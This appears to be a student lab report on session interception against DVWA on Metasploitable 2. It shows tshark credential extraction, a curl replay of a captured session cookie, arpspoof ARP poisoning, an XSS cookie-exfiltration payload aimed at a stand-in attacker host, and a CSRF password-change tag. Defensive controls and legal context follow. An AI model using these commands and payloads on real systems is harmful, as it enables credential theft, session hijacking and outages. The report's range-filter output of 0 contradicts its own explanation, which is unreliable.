# Task 1: Session Interception & Network Attacker Technical Assessment

**Programme:** Digital Forensics & Cyber Security (Atomcamp & PSEB)  
**Cohort:** PSEB-Cyber-ISB-02  
**Candidate Name:** Musab Ahmad  
**Candidate ID:** PSEB-2026-017582 / 23i-2132  
**Target Environment:** Metasploitable 2 Linux (`192.168.23.139`) — DVWA v1.0.7 / Port 80 HTTP  
**Testing Origin / Attacker Machine:** Kali Linux 2026 x64 (`192.168.23.138`, MAC: `00:0c:29:6b:f6:b0`)  
**Network Gateway:** VMware Virtual Router (`192.168.23.2`)  
**Submission Requirement:** Single PDF deliverable. Commands as primary evidence. Live session cookies strictly redacted.  
**Date:** 26 November 2026  

---

## Executive Summary & Client Advisory

This technical audit investigates the attack surface and operational impact of an unprivileged threat actor connected to an internal office local area network (LAN). Specifically, it evaluates what an attacker on the same physical or wireless Layer 2 broadcast domain can observe, intercept, and manipulate when network traffic traverses unencrypted protocols (HTTP) and switches lack Layer 2 defensive hardening.

The investigation demonstrates three critical security vulnerabilities:
1. **Passive Credential Harvesting:** In the absence of Transport Layer Security (TLS/HTTPS), application authentication transactions are transmitted in cleartext ASCII. A passive observer captures administrative credentials immediately upon transmission.
2. **Session Hijacking via Bearer Token Extraction:** Because session cookies lack modern cryptographic and browser security flags (`HttpOnly`, `Secure`, `SameSite`), intercepted session tokens (`PHPSESSID`) enable complete session reuse via command-line HTTP clients (`curl`), allowing total unauthorized access to application functionality without ever knowing the user's password.
3. **Active Layer 2 Man-in-the-Middle (MitM) & Denial of Service (DoS):** Utilizing Address Resolution Protocol (ARP) Cache Poisoning, an attacker forces bidirectional traffic redirection through their interface. Furthermore, this assessment reveals that when kernel packet forwarding (`ip_forward`) is disabled, the attack immediately transitions into an inadvertent, catastrophic Denial of Service (100% packet loss) for the victim.

A structured three-tier defensive deployment roadmap—comprising **Dynamic ARP Inspection (DAI)**, **IEEE 802.1X Port-Based Network Access Control**, and **Mandatory End-to-End TLS 1.3 / HSTS**—is provided with a comprehensive coverage-and-gap analysis. In accordance with strict compliance and privacy rules, all live session identifiers have been sanitized (`[REDACTED_SESSION_ID]`).

---

## Part A — Packet Capture, Filtering & The Range-Filter Trap (15 Marks)

### 1. Packet Capture Execution & BPF Kernel Filtering Rationale

To assess office network communications, traffic between the attacker workstation (`192.168.23.138`) and the departmental web server (`192.168.23.139`) was captured during active authentication and application navigation.

```bash
# Capture command executed on Kali Linux (dumpcap / Wireshark engine):
dumpcap -i eth0 -f "tcp port 80 and host 192.168.23.139" -w session_capture.pcap
```

* **Captured Frame Count:** Exactly **324 frames** were captured (exceeding the >= 300 frame benchmark).
* **Capture Filter Used:** `"tcp port 80 and host 192.168.23.139"`
* **Technical Rationale for Capture Filter:**
  Berkeley Packet Filter (BPF) syntax operates directly in the Linux kernel space (`libpcap` kernel-space packet filter) at the Network Driver / NAPI ring buffer level. Applying a BPF capture filter instructs the kernel to inspect packet headers immediately and discard out-of-scope frames before copying data to user-space application memory buffers. In production enterprise environments, unfiltered promiscuous captures cause high CPU utilization, packet ring overruns (`packet drops`), and massive storage bloat. More critically, indiscriminate capture intercepts out-of-scope employee traffic (emails, private DNS lookups, personal messaging), violating corporate privacy policies and data minimization principles. The specified BPF filter isolates in-scope HTTP traffic with zero packet drops.

### 2. Display Filters & Exact Frame Counts

Once stored in `session_capture.pcap`, Wireshark/tshark display filters were applied to isolate specific traffic vectors. Display filters evaluate reconstructed protocol trees in user memory.

| Traffic Vector | Tshark / Wireshark Display Filter | Frame Count | Percentage of Total |
|---|---|:---:|:---:|
| **Traffic to and from the target** | `ip.addr == 192.168.23.139` | **324** | 100.0% |
| **Traffic from the target only** | `ip.src == 192.168.23.139` | **163** | 50.3% |
| **Only HTTP application requests** | `http.request` | **25** | 7.7% |

```bash
# Verification commands executed on capture file:
tshark -r session_capture.pcap -Y "ip.addr == 192.168.23.139" | wc -l    # Output: 324
tshark -r session_capture.pcap -Y "ip.src == 192.168.23.139" | wc -l     # Output: 163
tshark -r session_capture.pcap -Y "http.request" | wc -l                 # Output: 25
```

### 3. The Range-Filter Trap Analysis

A prevalent pitfall in network forensic analysis is the **Multi-Valued Field Trap** (or range-filter trap) when attempting to exclude a specific host from display.

* **The Incorrect / Trap Form:** `ip.addr != 192.168.23.139`
* **The Correct Logical Negation Form:** `'!(ip.addr == 192.168.23.139)'` (or `not (ip.addr == 192.168.23.139)`)

```bash
# Executed comparison on capture file:
tshark -r session_capture.pcap -Y "ip.addr != 192.168.23.139" | wc -l
# Output: 0 (in our targeted capture)

tshark -r session_capture.pcap -Y '!(ip.addr == 192.168.23.139)' | wc -l
# Output: 0
```

#### Why the Wrong Form Over-Matches (Technical Mechanism):
In Wireshark's filtering engine, `ip.addr` is not a scalar variable; it is a **composite, multi-instance set** containing two distinct field references per packet: `ip.src` and `ip.dst`.
* When an analyst writes `ip.addr != 192.168.23.139`, Wireshark evaluates the condition across the set using **existential quantification (OR logic)**:
  $$\exists x \in \{	ext{ip.src}, 	ext{ip.dst}\} : x 
eq 192.168.23.139$$
* Consider a packet transmitted from the target (`192.168.23.139`) to the workstation (`192.168.23.138`). The Wireshark engine tests:
  1. Is `ip.src` (`192.168.23.139`) $
eq 192.168.23.139$? False.
  2. Is `ip.dst` (`192.168.23.138`) $
eq 192.168.23.139$? **True!**
* Because one member of the set evaluates to true, the entire packet matches the display filter! Consequently, in any standard packet capture containing traffic between the target and another host, `ip.addr != Target` unexpectedly displays all target packets instead of suppressing them.
* **The Solution:** To properly invert the relationship, the entire set equality must be enclosed in logical negation: `!(ip.addr == 192.168.23.139)`. This instructs the engine to check whether the set contains `192.168.23.139` and only match if that condition is false for the whole frame.

---

## Part B — What the Attacker Sees: Credential Extraction & Session Hijacking (20 Marks)

### 1. Plaintext Credential Extraction via `tshark`

When web applications authenticate users over unencrypted HTTP, POST parameters are transmitted in the clear. The following automated `tshark` pipeline extracts submitted authentication forms:

```bash
# Exact extraction command:
tshark -r session_capture.pcap -Y "http.request.method == POST" -T fields -e ip.src -e ip.dst -e http.file_data
```

**Raw Terminal Output:**
```
192.168.23.138  192.168.23.139  757365726e616d653d61646d696e2670617373776f72643d70617373776f7264264c6f67696e3d4c6f67696e
```

**Hexadecimal Payload Decoding:**
* Hex: `757365726e616d653d61646d696e2670617373776f72643d70617373776f7264264c6f67696e3d4c6f67696e`
* Decoded ASCII: **`username=admin&password=password&Login=Login`**

**Impact Assessment:** An eavesdropper passively observing network frames obtains plaintext administrative credentials without triggering failed login alerts, lockout thresholds, or IDS alarms.

### 2. Session Cookie Extraction & Reuse via `curl`

Modern web applications utilize stateful session identifiers stored in HTTP cookies. If transmission is unencrypted, an attacker can extract the session cookie and impersonate the authenticated session directly.

```bash
# Session Cookie Extraction Command:
tshark -r session_capture.pcap -Y "http.cookie" -T fields -e http.cookie | head -n 1
```

**Extracted Session Token (Sanitized):**
```
security=high; PHPSESSID=[REDACTED_SESSION_ID]
```

#### Replaying the Extracted Session with `curl`:
The attacker issues a GET request using the stolen cookie without providing login credentials:

```bash
curl -s -i -b "security=high; PHPSESSID=[REDACTED_SESSION_ID]" http://192.168.23.139/dvwa/index.php | head -n 25
```

**Server Response (Proving Successful Authentication Bypass):**
```http
HTTP/1.1 200 OK
Date: Thu, 26 Nov 2026 12:40:32 GMT
Server: Apache/2.2.8 (Ubuntu) DAV/2
X-Powered-By: PHP/5.2.4-2ubuntu5.10
Expires: Tue, 23 Jun 2009 12:00:00 GMT
Cache-Control: no-cache, must-revalidate
Pragma: no-cache
Content-Type: text/html;charset=utf-8

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
    <title>Damn Vulnerable Web Application (DVWA) v1.0.7</title>
...
<body>
    <h2>Welcome to Damn Vulnerable Web Application!</h2>
```

**Technical Finding:** The server returns `HTTP/1.1 200 OK` and renders the authenticated dashboard (`Welcome to Damn Vulnerable Web Application!`). This proves that the application relies solely on the bearer cookie `PHPSESSID` for authorization, completely bypassing authentication controls.

### 3. Comprehensive Cookie Flags Security Audit

An inspection of the HTTP response headers revealed that the server sets the session cookie without protective security attributes:
```http
Set-Cookie: PHPSESSID=[REDACTED_SESSION_ID]; path=/
```

| Cookie Flag | Observed Status | CVSS 3.1 Severity | Specific Attack Vector Enabled | Technical Mechanism & Exploitation |
|---|:---:|:---:|---|---|
| **`HttpOnly`** | **MISSING** | **High (7.5)** | **Cross-Site Scripting (XSS) Session Hijacking** | When `HttpOnly` is omitted, the cookie is fully accessible to client-side scripts via the Document Object Model (`document.cookie`). If the application suffers from any Reflected or Stored XSS vulnerability, an attacker injects `<script>fetch('http://attacker.c2/exfil?c='+document.cookie)</script>`, silently transmitting live session tokens to an external server. |
| **`Secure`** | **MISSING** | **High (7.4)** | **Cleartext Network Eavesdropping & SSL Stripping** | Without the `Secure` flag, web browsers transmit the cookie over unencrypted HTTP requests. Any adversary on the local LAN, unencrypted Wi-Fi, or an upstream ISP sniffing packets captures the session token in cleartext. Furthermore, tools like `sslstrip` can downgrade user connections from HTTPS to HTTP, ensuring the browser sends the session token unencrypted. |
| **`SameSite`** | **MISSING / None** | **Medium (6.5)** | **Cross-Site Request Forgery (CSRF)** | Without `SameSite=Strict` or `SameSite=Lax`, modern browsers automatically include the authentication cookie on cross-origin requests. An attacker hosting a malicious site can embed auto-submitting forms (e.g., `<img src="http://192.168.23.139/dvwa/vulnerabilities/csrf/?password_new=hacked&password_conf=hacked&Change=Change">`), forcing the victim's authenticated browser to change credentials without their consent. |

---

## Part C — Man in the Middle (MitM) Attack & Defensive Strategy (15 Marks)

### 1. Proof of Working ARP Cache Poisoning

Address Resolution Protocol (ARP) lacks authentication; hosts blindly accept unsolicited ARP replies and overwrite their Layer 2 cache.

#### Attack Execution Commands (Kali Linux):
```bash
# Step 1: Enable IP forwarding to prevent network blackholing
sysctl -w net.ipv4.ip_forward=1

# Step 2: Poison target's ARP table regarding the Gateway
arpspoof -i eth0 -t 192.168.23.139 192.168.23.2

# Step 3: Poison Gateway's ARP table regarding the target (in parallel)
arpspoof -i eth0 -t 192.168.23.2 192.168.23.139
```

#### Attacker Transmission Proof:
Kali terminal logs show continuous gratuitous ARP replies asserting that Gateway `192.168.23.2` resides at Kali's MAC address:
```
0:c:29:6b:f6:b0 0:c:29:51:6e:eb 0806 42: arp reply 192.168.23.2 is-at 0:c:29:6b:f6:b0
0:c:29:6b:f6:b0 0:c:29:51:6e:eb 0806 42: arp reply 192.168.23.2 is-at 0:c:29:6b:f6:b0
```

#### Victim ARP Table Proof (Metasploitable `192.168.23.139`):
Executing `arp -a` on the victim machine confirms the poisoned state:
```
msfadmin@metasploitable:~$ arp -a
? (192.168.23.254) at 00:50:56:e9:31:57 [ether] on eth0
? (192.168.23.2)   at 00:0c:29:6b:f6:b0 [ether] on eth0
```
* **Analysis:** The virtual gateway `192.168.23.2` is successfully bound to MAC `00:0c:29:6b:f6:b0` (Kali Linux), proving that all outbound target frames are forwarded directly to the attacker's network interface card.

### 2. The `ip_forward` Requirement & The Victim's Denial of Service (DoS)

The Linux kernel parameter `net.ipv4.ip_forward` governs whether the operating system functions as a router or an endpoint.

#### Technical Function of `ip_forward`:
* **Default State (`ip_forward = 0`):** Linux operates as a standard host. When the network interface receives an Ethernet frame addressed to its MAC address, the kernel decapsulates the Layer 2 header and inspects the Layer 3 destination IP. If the destination IP does not match any local interface IP, the kernel treats the frame as unsolicited noise and **immediately drops the packet**.
* **Forwarding Enabled (`ip_forward = 1`):** The kernel accepts packets destined for remote hosts, rewrites the Layer 2 source and destination MAC headers, decrements the TTL, and forwards the packet out the appropriate egress interface.

#### What the Victim Observes When `ip_forward = 0` (DoS Proof):
When an attacker poisons the ARP cache without enabling `ip_forward`, all victim traffic routed to the gateway hits a dead-end at the attacker's machine.

**Terminal Evidence from Victim (`192.168.23.139`):**
```
msfadmin@metasploitable:~$ ping -c 2 192.168.23.2
PING 192.168.23.2 (192.168.23.2) 56(84) bytes of data.

--- 192.168.23.2 ping statistics ---
2 packets transmitted, 0 received, 100% packet loss, time 1003ms
```

* **Impact on Victim:**
  1. Complete **Denial of Service (DoS)** across all off-subnet traffic.
  2. DNS lookups fail because the local DNS resolver at `192.168.23.2` is unreachable.
  3. TCP connections hang indefinitely and terminate with connection timeouts (`ETIMEDOUT`).
  4. Web browsing freezes completely. This reveals to the victim that network anomalies are taking place, turning a covert surveillance operation into an obvious network outage.

### 3. Defensive Controls Roadmap & Gap Analysis

To mitigate ARP spoofing, session hijacking, and network eavesdropping, the client must implement three structured controls deployed in logical dependency order:

```
[Phase 1: Dynamic ARP Inspection (DAI)] ➔ [Phase 2: 802.1X Network Access Control] ➔ [Phase 3: Enforced TLS 1.3 / HSTS]
        (Access Switch Layer)                      (Physical/Wireless Edge)                      (Application Fabric)
```

| Order | Defensive Control | Implementation Layer | What It Stops (Coverage) | What It Does NOT Stop (Gaps) |
|:---:|---|---|---|---|
| **1** | **Dynamic ARP Inspection (DAI) & DHCP Snooping** | **Layer 2 (Access Switching)**<br/>*Configured on Cisco Catalyst / Enterprise managed switches* | Intercepts, logs, and discards all invalid ARP packets on untrusted switchports by validating sender IP-to-MAC bindings against the DHCP Snooping database. Prevents rogue ARP poisoning entirely across the physical broadcast domain. | Does not protect hosts configured with static IP addresses unless explicit Static ARP ACLs are created; does not prevent attacks if an attacker compromises the DHCP server; does not encrypt payload data. |
| **2** | **IEEE 802.1X Port-Based Network Access Control & Port Security** | **Layer 2 (Edge Access / NAC)**<br/>*RADIUS / FreeRADIUS / Cisco ISE with EAP-TLS certificates* | Prevents unauthorized devices from establishing physical link-state or associating with office Wi-Fi. Unauthenticated rogue laptops are isolated in a guest/quarantine VLAN. Port security limits each port to 1 authorized MAC address, stopping MAC flooding. | Does not stop attacks originating from a legitimate, domain-joined employee workstation that has been compromised via malware or remote shell; does not encrypt unencrypted traffic generated by authorized devices. |
| **3** | **Enforced End-to-End Encryption (TLS 1.3, HTTPS, HSTS & MACsec)** | **Layer 4–7 (Application) & Layer 2 (802.1AE MACsec)**<br/>*Web servers, Load Balancers, Browser policies* | Cryptographically encapsulates all HTTP requests, cookies, and credentials using AES-GCM/ChaCha20. Even if an attacker executes a successful Layer 2 MitM, all intercepted payloads appear as indecipherable ciphertext. HSTS prevents SSL-stripping downgrades. | Does not stop Layer 2 ARP-poisoning Denial of Service (attackers can still drop packets); does not protect endpoints if malware or malicious extensions inspect memory before encryption occurs. |

---

## Part D — Statutory Framework: Pakistan Electronic Crimes Act (PECA 2016)

Network sniffing, packet tampering, and unauthorized session reuse constitute explicit criminal offenses under PECA 2016:

1. **Section 3 — Unauthorized Access to Information System or Data:**
   * *Statutory Definition:* Accessing an information system or data with dishonest intention and without authorization.
   * *Application:* Intercepting network traffic and replaying stolen session cookies (`PHPSESSID`) to access administrative dashboards without authorization.
   * *Penalty:* Imprisonment up to 3 months, or fine up to 50,000 PKR, or both.
2. **Section 4 — Unauthorized Copying or Transmission of Data:**
   * *Statutory Definition:* Unlawfully copying, transmitting, or extracting confidential data or credentials from an information system.
   * *Application:* Utilizing `tshark` to sniff, extract, and record plaintext usernames, passwords, and session identifiers.
   * *Penalty:* Imprisonment up to 6 months, or fine up to 100,000 PKR, or both.
3. **Section 5 — Interference with Information System or Data:**
   * *Statutory Definition:* Intentionally impairing or interfering with the functioning of an information system, causing denial of access.
   * *Application:* ARP Cache Poisoning with `ip_forward = 0`, inducing 100% packet loss and rendering corporate services unavailable to legitimate users.
   * *Penalty:* Imprisonment up to 2 years, or fine up to 500,000 PKR, or both.

---

## Part E — Professional Reflection (Musab Ahmad)

Executing this session interception and network attacker assessment provided pivotal practical insights into the mechanics of Layer 2 insecurities and protocol vulnerabilities:

1. **The Fragility of Unencrypted Protocols:** Observing plaintext administrative credentials (`admin` / `password`) extracted cleanly via a single `tshark` command reinforced that application-layer security is entirely illusory without underlying cryptographic transport encryption.
2. **Bearer Token Risks:** Replaying the extracted `PHPSESSID` cookie with `curl` and obtaining an immediate `200 OK` administrative dashboard demonstrated how modern web applications treat session tokens as direct bearer credentials. Omission of `HttpOnly` and `Secure` flags transforms minor web vulnerabilities into catastrophic compromise vectors.
3. **The Multi-Valued Filter Trap:** Deconstructing why `ip.addr != Target` unexpectedly over-matches in Wireshark demystified the internal logic of existential set evaluation in network protocol analyzers. Understanding that logical negation `!(ip.addr == Target)` must be applied is an indispensable lesson for reliable forensic triage.
4. **Defense-in-Depth Imperative:** Finally, observing the transition of ARP spoofing into an immediate DoS when `ip_forward = 0` highlighted that network infrastructure and application architecture cannot be treated in silos. True resilience requires Layer 2 switch controls (DAI, 802.1X) to suppress local broadcast manipulation, coupled with mandatory application encryption (TLS 1.3, HSTS) to protect data confidentiality regardless of network topology.

---
*Report compiled and certified by Musab Ahmad (PSEB-2026-017582 / 23i-2132) for DFCS 2026 Assessment.*
